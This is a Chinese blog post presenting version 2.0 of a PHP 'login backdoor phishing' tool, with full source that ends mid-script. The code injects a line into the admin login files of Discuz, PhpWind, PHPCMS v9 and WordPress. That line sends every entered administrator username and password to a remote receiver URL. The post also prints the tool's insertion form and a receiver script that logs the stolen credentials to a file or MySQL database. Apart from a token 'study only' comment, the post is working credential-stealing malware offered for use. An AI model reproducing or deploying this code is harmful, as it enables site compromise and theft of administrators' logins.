<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>登录后门钓鱼程序 V2.0 | Return&#39;s Blog </title>
  <meta name="author" content="Return">
  
  <meta name="description" content="专注于互联网开发技术，注重网络安全技术，注重网络攻防技术，注重渗透测试技术，backtrack5渗透测试平台研究，软件开发，网页设计，网页制作，网站建设">
  
  
  <meta property="og:title" content="登录后门钓鱼程序 V2.0"/>
  <meta property="og:site_name" content="Return&#39;s Blog "/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta property="og:image" content="undefined"/>
  
   <link rel="apple-touch-icon" href="/icon.png" />
   <link rel="shortcut icon" href="/favicon.png" >
   <link rel="alternate" href="http://www.creturn.com/atom.xml" title="Return&#39;s Blog " type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
</head>


<body>
  <div id="content" class="inner">
    <aside id="sidebar" class="alignleft">
      <div class="navigationBar">
        <a href="/">Return&#39;s Blog </a>
      </div>
    	
  <nav class="widget" id="menu">
	<ul>
    
      <li class="cell"><a class="next" href="/">Home</a><li>
    
      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
    
      <li class="cell"><a class="next" href="/about/">About</a><li>
    
    </ul>
</nav>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/原创作品/">原创作品</a><small>30</small></li>
  
    <li><a href="/categories/原创作品/技术文章/">技术文章</a><small>23</small></li>
  
    <li><a href="/categories/技术文章/">技术文章</a><small>7</small></li>
  
    <li><a href="/categories/技术文章/最新漏洞/">最新漏洞</a><small>2</small></li>
  
    <li><a href="/categories/原创作品/技术文章/最新漏洞/">最新漏洞</a><small>3</small></li>
  
    <li><a href="/categories/最新漏洞/">最新漏洞</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/Android/" style="font-size: 10.00px;">Android</a><a href="/tags/Backtrack5/" style="font-size: 10.00px;">Backtrack5</a><a href="/tags/Metasploit/" style="font-size: 10.00px;">Metasploit</a><a href="/tags/Mysql/" style="font-size: 10.00px;">Mysql</a><a href="/tags/Nginx解析漏洞/" style="font-size: 10.00px;">Nginx解析漏洞</a><a href="/tags/Return/" style="font-size: 10.00px;">Return</a><a href="/tags/ThinkPHP远程/" style="font-size: 10.00px;">ThinkPHP远程</a><a href="/tags/alfred/" style="font-size: 10.00px;">alfred</a><a href="/tags/android/" style="font-size: 13.33px;">android</a><a href="/tags/apache/" style="font-size: 10.00px;">apache</a><a href="/tags/armitage/" style="font-size: 10.00px;">armitage</a><a href="/tags/arp欺骗/" style="font-size: 10.00px;">arp欺骗</a><a href="/tags/cain/" style="font-size: 10.00px;">cain</a><a href="/tags/dedecms漏洞/" style="font-size: 10.00px;">dedecms漏洞</a><a href="/tags/easyui/" style="font-size: 10.00px;">easyui</a><a href="/tags/eclipse/" style="font-size: 10.00px;">eclipse</a><a href="/tags/java/" style="font-size: 10.00px;">java</a><a href="/tags/linux-arp欺骗/" style="font-size: 10.00px;">linux arp欺骗</a><a href="/tags/os-x/" style="font-size: 10.00px;">os x</a><a href="/tags/php/" style="font-size: 13.33px;">php</a><a href="/tags/phpcmsv9漏洞/" style="font-size: 16.67px;">phpcmsv9漏洞</a><a href="/tags/phpcsm2008漏洞/" style="font-size: 10.00px;">phpcsm2008漏洞</a><a href="/tags/python/" style="font-size: 13.33px;">python</a><a href="/tags/thinkPHP漏洞/" style="font-size: 10.00px;">thinkPHP漏洞</a><a href="/tags/ubuntu/" style="font-size: 10.00px;">ubuntu</a><a href="/tags/web-wifi认证/" style="font-size: 10.00px;">web wifi认证</a><a href="/tags/webshell/" style="font-size: 20.00px;">webshell</a><a href="/tags/window密码/" style="font-size: 10.00px;">window密码</a><a href="/tags/wordpress漏洞/" style="font-size: 13.33px;">wordpress漏洞</a><a href="/tags/workflow/" style="font-size: 10.00px;">workflow</a><a href="/tags/xUtils/" style="font-size: 10.00px;">xUtils</a><a href="/tags/互联网技术/" style="font-size: 10.00px;">互联网技术</a><a href="/tags/任意密码登录/" style="font-size: 10.00px;">任意密码登录</a><a href="/tags/任意读取文件漏洞/" style="font-size: 10.00px;">任意读取文件漏洞</a><a href="/tags/入侵/" style="font-size: 10.00px;">入侵</a><a href="/tags/后门/" style="font-size: 20.00px;">后门</a><a href="/tags/嗅探/" style="font-size: 10.00px;">嗅探</a><a href="/tags/图马/" style="font-size: 10.00px;">图马</a><a href="/tags/打飞机/" style="font-size: 10.00px;">打飞机</a><a href="/tags/注入漏洞/" style="font-size: 10.00px;">注入漏洞</a>
  </div>
</div>


    	<footer id="footer" class="inner"><div class="copyright">
  
  &copy; 2015 Return
  
</div>


<div style="position:relative; bottom: 23px">
  <script src="http://s95.cnzz.com/stat.php?id=4287542&web_id=4287542&show=pic1" language="JavaScript">
  </script>
</div>


</footer>
    </aside>
    
    
    <div id="hidden-navigationBar" class="navigationBar">
      <a href="/">Return&#39;s Blog </a>
    </div>
    <div id="main-col" class="alignright">
    <div id="wrapper">
      
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title">登录后门钓鱼程序 V2.0</h1>
  

      <time datetime="2012-07-04T15:59:07.000Z"><a href="/html/2012-07-04-登录后门钓鱼程序-v2-0.html">7月 4 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>此版本中相对1.0版本加入了接收端mysql存储支持。</p>
<p>自动插入后门端加入dz和wordpress的支持</p>
<p>代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> +-----------------------------------------------------------------</div><div class="line"> * 登录后门钓鱼程序 V2.0</div><div class="line"> +-----------------------------------------------------------------</div><div class="line"> * 功能介绍：</div><div class="line"> * 本程序会根据所选cms和BBS系统自动插入钓鱼后门</div><div class="line"> * 后续将完善支持PHP的主流的cms和bbs系统</div><div class="line"> * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息</div><div class="line"> +-----------------------------------------------------------------</div><div class="line"> * 作者： Return Blogs: www.creturn.com email:master@creturn.com</div><div class="line"> +-----------------------------------------------------------------</div><div class="line"> **/</div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="variable">$rHost</span> = <span class="string">'http://192.168.1.199/MyProject/server/sever.php'</span>; <span class="comment">//定义接收地址</span></div><div class="line"><span class="variable">$pUname</span> = <span class="string">'uname'</span>; <span class="comment">//远程端接收用户名参数</span></div><div class="line"><span class="variable">$pPwd</span> = <span class="string">'pwd'</span>; <span class="comment">//定义远程接收密码参数</span></div><div class="line"><span class="variable">$error</span> = <span class="string">''</span>;</div><div class="line"><span class="comment">/**</span></div><div class="line"> * 插入代码</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">inSertPwdDoor</span><span class="params">(<span class="variable">$cmsCode</span>,<span class="variable">$relPath</span>)</span></span>{</div><div class="line"> <span class="keyword">global</span> <span class="variable">$rHost</span>,<span class="variable">$pUname</span>,<span class="variable">$pPwd</span>;</div><div class="line"> <span class="comment">//读取用户名密码特制</span></div><div class="line"> <span class="keyword">if</span>(<span class="variable">$cmsCode</span>[<span class="string">'mothed'</span>] == <span class="string">'post'</span>){</div><div class="line"> <span class="variable">$rHostPath</span> = <span class="variable">$rHost</span>.<span class="string">'?'</span>.<span class="variable">$pUname</span>.<span class="string">'=$_POST['</span>.<span class="variable">$cmsCode</span>[<span class="string">'uname'</span>].<span class="string">']&amp;'</span>.<span class="variable">$pPwd</span>.<span class="string">'=$_POST['</span>.<span class="variable">$cmsCode</span>[<span class="string">'pwd'</span>].<span class="string">']'</span>;</div><div class="line"> }<span class="keyword">else</span>{</div><div class="line"> <span class="variable">$rHostPath</span> = <span class="variable">$rHost</span>.<span class="string">'?'</span>.<span class="variable">$pUname</span>.<span class="string">'=$_GET['</span>.<span class="variable">$cmsCode</span>[<span class="string">'uname'</span>].<span class="string">']&amp;'</span>.<span class="variable">$pPwd</span>.<span class="string">'=$_GET['</span>.<span class="variable">$cmsCode</span>[<span class="string">'pwd'</span>].<span class="string">']'</span>;</div><div class="line"> }</div><div class="line"> <span class="comment">//获取插入代码</span></div><div class="line"> <span class="variable">$keyword</span> = <span class="variable">$cmsCode</span>[<span class="string">'keyword'</span>];</div><div class="line"> <span class="variable">$replace</span> = <span class="string">'file_get_contents(&quot;'</span>.<span class="variable">$rHostPath</span>.<span class="string">'&quot;);'</span>.<span class="variable">$cmsCode</span>[<span class="string">'bedeck'</span>].<span class="variable">$keyword</span>;</div><div class="line"> <span class="variable">$loginPageContent</span> = file_get_contents(<span class="variable">$relPath</span>);</div><div class="line"> <span class="variable">$loginPageContent</span> = str_replace(<span class="variable">$keyword</span>, <span class="variable">$replace</span>, <span class="variable">$loginPageContent</span>);</div><div class="line"> <span class="keyword">if</span>(file_put_contents(<span class="variable">$relPath</span>, <span class="variable">$loginPageContent</span>)){</div><div class="line"> tipAmessage(<span class="string">'成功插入！'</span>);</div><div class="line"> }<span class="keyword">else</span>{</div><div class="line"> tipAmessage(<span class="string">'插入失败！'</span>);</div><div class="line"> }</div><div class="line">}</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">tipAmessage</span><span class="params">(<span class="variable">$msg</span>)</span></span>{</div><div class="line"> <span class="keyword">global</span> <span class="variable">$error</span>;</div><div class="line"> <span class="variable">$error</span> = <span class="variable">$msg</span>;</div><div class="line">}</div><div class="line"><span class="comment">/**</span></div><div class="line"> * 各类cms登录标识码和文件路径</div><div class="line"> *</div><div class="line"> * $code说明：</div><div class="line"> * $code['keyword'] 关键字，就是要插入代码的特征码</div><div class="line"> * $code['bedeck'] 修饰符用来修正代码的外观</div><div class="line"> * $code['uname'] 用户名变量名</div><div class="line"> * $code['pwd'] 密码变量名</div><div class="line"> * $code['mothed'] 密码提交方式：POST 或者 GET</div><div class="line"> * $code['path'] 登录文件路径</div><div class="line"> * 注意事项：</div><div class="line"> * 由于登录口不同程序可能有多个登录方法，正常登录</div><div class="line"> * 或者ajax或者第三方登录，所以登录点的关键词必须找准</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">switchCms</span><span class="params">(<span class="variable">$cmsName</span>)</span></span>{</div><div class="line"> <span class="variable">$code</span> = <span class="keyword">array</span>();</div><div class="line"> <span class="keyword">switch</span> (<span class="variable">$cmsName</span>) {</div><div class="line"> <span class="keyword">case</span> <span class="string">'phpcmsV9'</span>:</div><div class="line"> <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'phpcms/modules/admin/index.php'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;showmessage(L(<span class="string">'login_success'</span>),<span class="string">'?m=admin&amp;c=index'</span>);&quot;;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nttt&quot;;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'username'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'password'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;</div><div class="line"> <span class="keyword">break</span>;</div><div class="line"> <span class="keyword">case</span> <span class="string">'dedecms'</span>:</div><div class="line"> <span class="keyword">break</span>;</div><div class="line"> <span class="keyword">case</span> <span class="string">'dz'</span>:</div><div class="line"> <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'source/class/class_admincp.php'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;<span class="variable">$cpgroupid</span> = DB::result_first&quot;;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nttttt&quot;;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'admin_username'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'admin_password'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;</div><div class="line"> <span class="keyword">break</span>;</div><div class="line"> <span class="keyword">case</span> <span class="string">'phpwind'</span>:</div><div class="line"> <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'admin/admincp.php'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;<span class="variable">$REQUEST_URI</span> = trim(<span class="variable">$REQUEST_URI</span>,<span class="string">'?#'</span>);&quot;;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nt&quot;;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'admin_name'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'admin_pwd'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;</div><div class="line"> <span class="keyword">break</span>;</div><div class="line"> <span class="keyword">case</span> <span class="string">'wordpress'</span>:</div><div class="line"> <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'wp-includes/user.php'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;<span class="variable">$user</span> = <span class="keyword">new</span> WP_User(<span class="variable">$userdata</span>-&gt;ID);&quot;;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nt&quot;;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'log'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'pwd'</span>;</div><div class="line"> <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;</div><div class="line"> <span class="keyword">break</span>;</div><div class="line"> <span class="keyword">default</span>:</div><div class="line"> ;</div><div class="line"> <span class="keyword">break</span>;</div><div class="line"> }</div><div class="line"> <span class="keyword">return</span> <span class="variable">$code</span>;</div><div class="line"></div><div class="line">}</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'creack'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'creack'</span>] != <span class="string">''</span>){</div><div class="line"> <span class="variable">$webRoot</span> = <span class="variable">$_SERVER</span>[<span class="string">'DOCUMENT_ROOT'</span>]; <span class="comment">//当前目录</span></div><div class="line"> <span class="variable">$dir</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) : <span class="string">''</span>;</div><div class="line"> <span class="variable">$cms</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) : <span class="string">''</span>;</div><div class="line"> <span class="variable">$cmsCode</span> = switchCms(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]);</div><div class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$cmsCode</span>)){</div><div class="line"> <span class="variable">$error</span> = <span class="string">'没找到可用CMS或者BBS'</span>;</div><div class="line"> }<span class="keyword">else</span>{</div><div class="line"> <span class="variable">$relPath</span> = <span class="variable">$webRoot</span>.<span class="variable">$dir</span>.<span class="variable">$cmsCode</span>[<span class="string">'path'</span>];</div><div class="line"> <span class="keyword">if</span>(file_exists(<span class="variable">$relPath</span>)){</div><div class="line"> inSertPwdDoor(<span class="variable">$cmsCode</span>,<span class="variable">$relPath</span>);</div><div class="line"> }<span class="keyword">else</span>{</div><div class="line"> tipAmessage(<span class="string">'没有找到该文件路径：'</span>.<span class="variable">$relPath</span>);</div><div class="line"> }</div><div class="line"> }</div><div class="line">}</div></pre></td></tr></table></figure>

<a id="more"></a>

<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="doctype">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span></div><div class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</div><div class="line">&lt;title&gt;自动插入语句&lt;/title&gt;</div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">*{</div><div class="line">font-size:14px;</div><div class="line">line-height:20px;</div><div class="line">}</div><div class="line">div{</div><div class="line"> width:450px;</div><div class="line"> margin: 0px auto;</div><div class="line">}</div><div class="line">?&gt;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">&lt;div style=&quot;width:600px;margin: 0px auto;padding-top: 50px;padding-bottom: 50px; border: 1px #fff012 solid;&quot;&gt;</div><div class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</div><div class="line"> &lt;div&gt;</div><div class="line"> &lt;h2 style=&quot;text-align: center;&quot;&gt;登录后门钓鱼程序 V2.0 &lt;/h2&gt;</div><div class="line"> &lt;/div&gt;</div><div class="line"> &lt;div&gt;</div><div class="line"> &lt;h4 style=&quot;color: red&quot;&gt;注意：Path参数，默认根目录不用填写，如果目标程序在子目录中请填入路径&lt;/h4&gt;</div><div class="line"> &lt;/div&gt;</div><div class="line"> &lt;div&gt;</div><div class="line"> 当前文件路径：&lt;?php echo __FILE__?&gt;&lt;br/&gt;</div><div class="line"> &lt;/div&gt;</div><div class="line"> &lt;div&gt;</div><div class="line"> &lt;input type=&quot;radio&quot; value=&quot;dz&quot; name=&quot;cms&quot; id=&quot;dzcms&quot; /&gt;&lt;label for=&quot;dzcms&quot;&gt;Discuz&lt;/label&gt;</div><div class="line"> &lt;input type=&quot;radio&quot; value=&quot;phpwind&quot; name=&quot;cms&quot; id=&quot;phpwind&quot; /&gt;&lt;label for=&quot;phpwind&quot;&gt;PhpWind&lt;/label&gt;</div><div class="line"> &lt;input type=&quot;radio&quot; value=&quot;phpcmsV9&quot; name=&quot;cms&quot; id=&quot;v9cms&quot; /&gt;&lt;label for=&quot;v9cms&quot;&gt;PHPCMSv9&lt;/label&gt;</div><div class="line"> &lt;input type=&quot;radio&quot; value=&quot;dedecms&quot; name=&quot;cms&quot; id=&quot;dedecms&quot; /&gt;&lt;label for=&quot;dedecms&quot;&gt;DedeCms&lt;/label&gt;</div><div class="line"> &lt;input type=&quot;radio&quot; value=&quot;wordpress&quot; name=&quot;cms&quot; id=&quot;wrodpress&quot; /&gt;&lt;label for=&quot;wrodpress&quot;&gt;WordPress&lt;/label&gt;</div><div class="line"> &lt;/div&gt;</div><div class="line"></div><div class="line"> &lt;div&gt;</div><div class="line"> &lt;span&gt;Path:&lt;/span&gt;&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;dir&quot; /&gt;</div><div class="line"> &lt;input type=&quot;submit&quot; name=&quot;creack&quot; value=&quot;插入后门&quot; /&gt;</div><div class="line"> &lt;/div&gt;</div><div class="line"> &lt;div style=&quot;text-align: left; color: red; margin-top:20px;&quot;&gt;消息：&lt;?php echo $error;?&gt;&lt;/div&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>

<p>接收端：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"> * 用来接收钓鱼程序提交过来的密码，</div><div class="line"> * 本程序目前支持存储文件和数据库两种方式</div><div class="line"> * 后续开发中将支持mail提醒，和第三方接口</div><div class="line"> * QQ消息，其实自己很久没研究了，不知道现在</div><div class="line"> * 的接口还能用不。可以到时候集成进来</div><div class="line"> * 本服务端可独立使用，提交方式</div><div class="line"> * http://localhost/sever.php?uname=用户名&amp;pwd=密码&amp;rsite=站点名字</div><div class="line"> * Author:Return Blogs: www.creturn.com Email: master@creturn.com</div><div class="line"> * 版本：V 2.0</div><div class="line"> *</div><div class="line"> */</div><div class="line"><span class="variable">$saveWay</span> = <span class="string">'mysql'</span>; <span class="comment">//存储方式,mysql:存储数据库中，file:存储文件中,mail,通过邮件发送,qq:通过webQQ协议实现QQ发送消息</span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * 安全过滤</div><div class="line"> * 根据你自己的需求自行添加</div><div class="line"> * 建议添加上去，防止被注入</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterSecInfo</span><span class="params">()</span></span>{</div><div class="line"></div><div class="line">}</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * 保存为文本形式</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveToText</span><span class="params">()</span></span>{</div><div class="line"> <span class="variable">$pwd</span> = <span class="string">'pwd.txt'</span>;</div><div class="line"> <span class="variable">$content</span> = @file_get_contents(<span class="variable">$pwd</span>).&quot;n Uname:&quot;.<span class="variable">$_GET</span>[<span class="string">'uname'</span>].<span class="string">'#Pwd:'</span>.<span class="variable">$_GET</span>[<span class="string">'pwd'</span>].<span class="string">'#site:'</span>.<span class="variable">$_GET</span>[<span class="string">'rsite'</span>];</div><div class="line"> file_put_contents(<span class="variable">$pwd</span>, <span class="variable">$content</span>);</div><div class="line">}</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * 保存到数据库</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveToDBserver</span><span class="params">()</span></span>{</div><div class="line"></div><div class="line"> filterSecInfo(); <span class="comment">//过滤安全隐患</span></div><div class="line"></div><div class="line"> <span class="comment">//插入数据库中的值</span></div><div class="line"> <span class="variable">$name</span> = @<span class="variable">$_GET</span>[<span class="string">'uname'</span>];</div><div class="line"> <span class="variable">$pword</span> = @<span class="variable">$_GET</span>[<span class="string">'pwd'</span>];</div><div class="line"> <span class="variable">$site</span> = @<span class="variable">$_GET</span>[<span class="string">'rsite'</span>];</div><div class="line"></div><div class="line"> <span class="keyword">empty</span>(<span class="variable">$name</span>) || <span class="keyword">empty</span>(<span class="variable">$pword</span>) ? <span class="keyword">exit</span>(<span class="string">'Not Insert'</span>) : <span class="string">''</span>; <span class="comment">//如果密码或者用户名为空就不用存储了</span></div><div class="line"> <span class="variable">$site</span> = <span class="keyword">empty</span>(<span class="variable">$site</span>) ? <span class="string">'No site info'</span> : <span class="variable">$site</span>;</div><div class="line"></div><div class="line"> <span class="comment">//数据库配置</span></div><div class="line"></div><div class="line"><span class="variable">$dbHost</span> = <span class="string">'localhost'</span>; <span class="comment">//数据库主机地址，默认本地数据库localhost</span></div><div class="line"> <span class="variable">$dbName</span> = <span class="string">'pwd'</span>; <span class="comment">//数据库名</span></div><div class="line"> <span class="variable">$uname</span> = <span class="string">'root'</span>; <span class="comment">//数据库用户名</span></div><div class="line"> <span class="variable">$pwd</span> = <span class="string">''</span>; <span class="comment">//数据库密码</span></div><div class="line"></div><div class="line"> <span class="variable">$con</span> = @mysql_connect(<span class="variable">$dbHost</span>,<span class="variable">$uname</span>,<span class="variable">$pwd</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'无法连接数据库，请确认数据库信息可用！'</span>);</div><div class="line"> mysql_select_db(<span class="variable">$dbName</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'没找到此数据库，请创建！'</span>);</div><div class="line"></div><div class="line"> <span class="variable">$sql</span> = &quot;SELECT * FROM `adminlist` WHERE `name` = <span class="string">'$name'</span> <span class="keyword">AND</span> `password` = <span class="string">'$pword'</span> <span class="keyword">AND</span> site = <span class="string">'$site'</span>&quot;;</div><div class="line"> <span class="variable">$result</span> = 